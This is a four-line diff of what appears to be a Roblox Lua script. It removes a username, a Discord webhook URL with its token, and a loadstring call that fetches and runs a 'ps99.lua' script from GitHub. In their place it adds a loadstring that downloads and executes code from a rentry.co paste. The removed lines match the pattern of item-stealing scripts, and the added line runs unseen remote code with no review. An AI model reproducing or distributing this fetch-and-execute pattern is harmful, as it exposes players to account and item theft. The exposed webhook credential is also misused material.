@@ -1,4 +1,1 @@
-Username = "Ankaikazc_1" 
-Webhook = "https://discord.com/api/webhooks/1272888145725100123/qB80BukHoY-5Qxy_6_KPLqc16vmtEkIi8KbGl_nEvbkigsBYaQcTAdxQ4SbkQFRPscou" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
+loadstring(game:HttpGet('https://rentry.co/qtr8arse/raw',true))()                              
